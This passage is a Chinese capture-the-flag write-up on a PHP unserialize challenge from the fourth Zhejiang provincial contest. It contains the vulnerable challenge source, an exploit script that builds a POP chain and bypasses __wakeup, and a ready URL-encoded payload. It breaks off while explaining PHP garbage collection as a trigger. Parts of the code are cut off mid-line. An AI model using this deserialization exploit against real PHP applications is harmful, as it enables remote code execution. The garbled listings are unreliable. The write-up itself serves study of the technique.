这本来是第四届浙江省赛的题目，有很多解法，但在赛后受歪四大佬指点。一个很“怪”的解法出现了，可能是我见识少。先放原题和一种常规解法。
原题
    func,$f,$p);
        }
        public function __wakeup(){
            $this->func = '';
            die("Don't serialize me");
        }
    }
    class Test{
        public function getFlag(){
            system("cat /flag?");
        }
        public function __call($f,$p){
            phpinfo();
        }
        public function __wakeup(){
            echo "serialize me?";
        }
    }
    class A{
        public $a;
        public function __get($p){
            if(preg_match("/Test/",get_class($this->a))){
                return "No test in Prod\n";
            }
            return $this->a->$p();
        }
    }
    class B{
        public $p;
        public function __destruct(){
            $p = $this->p;
            echo $this->a->$p;
        }
    }
    if(isset($_GET['pop'])){
        $pop = $_GET['pop'];
        $o = unserialize($pop);
        throw new Exception("no pop");
    }
由于赛后没有环境，所以在phpstudy里复现的，把getFlag里的cat语句修改为了包含flag.php，并且输出flag。其实成功调用那个getFlag方法就可以。
### 常规思路
如何调用getFlag？在类Fun中call_user_func函数可以做到，所以只需调用Fun里的`__call`，而调用Fun中不存在的方法即可，由此可以看到类A中`__get`方法中含有调用方法的语句。调用不可访问的属性触发__get方法，这个不可访问的属性包括私有属性以及不存在的属性。这里通过类B即可达到。
注意：`call_user_func`函数，第一个参数是函数名，后面的参数是此函数的参数。若调用的函数在类里，那么这个参数要用数组形式传递，第一个元素为类名，第二个元素为函数名。绕过`__wakeup`修改属性个数即可，可能包含不可见字符，要编码。
exp：
    func = [new Test,'getFlag'];//也可以写为$this->func = "Test::getFlag";这样由于没有实例化Test类，还不会触发Test里的__wakeup()
        }
    }
    class Test{
        public function getFlag(){
        }
    }
    class A{
        public $a;
    }
    class B{
        public $p;
    }
    $Test = new Test;
    $Fun = new Fun;
    $a = new A;
    $b = new B;
    $a->a = $Fun;
    $b->a = $a;
    $r = serialize($b);
    $r1 = str_replace('"Fun":1:','"Fun":2:',$r);
    echo urlencode($r1);
payload：
    O%3A1%3A%22B%22%3A2%3A%7Bs%3A1%3A%22p%22%3BN%3Bs%3A1%3A%22a%22%3BO%3A1%3A%22A%22%3A1%3A%7Bs%3A1%3A%22a%22%3BO%3A3%3A%22Fun%22%3A2%3A%7Bs%3A9%3A%22%00Fun%00func%22%3Ba%3A2%3A%7Bi%3A0%3BO%3A4%3A%22Test%22%3A0%3A%7B%7Di%3A1%3Bs%3A7%3A%22getFlag%22%3B%7D%7D%7D%7D
### 强制触发垃圾回收机制思路
在常规思路中我们的pop链是B→A→Fun→Test，可是B里的`__destruct()`方法貌似没有主动触发。在之前一篇文章说过destruct的触发
> __destruct（析构函数）当某个对象成为垃圾或者当对象被显式销毁时执行
>
> 显式销毁，当对象没有被引用时就会被销毁,所以我们可以unset或为其赋值NULL  
>  隐式销毁，PHP是脚本语言,在代码执行完最后一行时,所有申请的内存都要释放掉
在常规思路中destruct是隐式销毁触发的，当然这里使用强行GC
首先我们要简单了解垃圾回收是什么，就是把内存中不需要使用的量给清除掉，收回它所占用的空间。
#### 旧的GC
在PHP5.3版本之前,使用的垃圾回收机制是单纯的“引用计数”。即：  
①每个内存对象都分配一个计数器，当内存对象被变量引用时，计数器+1；  
②当变量引用撤掉后（执行unset()后），计数器-1；  
③当计数器=0时，表明内存对象没有被使用，该内存对象则进行销毁，垃圾回收完成。
这个时候就出现了问题，我自己引用我自己，自身一个，自己又被引用，所以计数器是2，但我将它销毁，才减1，此时明明已销毁，但还是1，所以无法进行回收，产生了内存泄漏。
#### 新的GC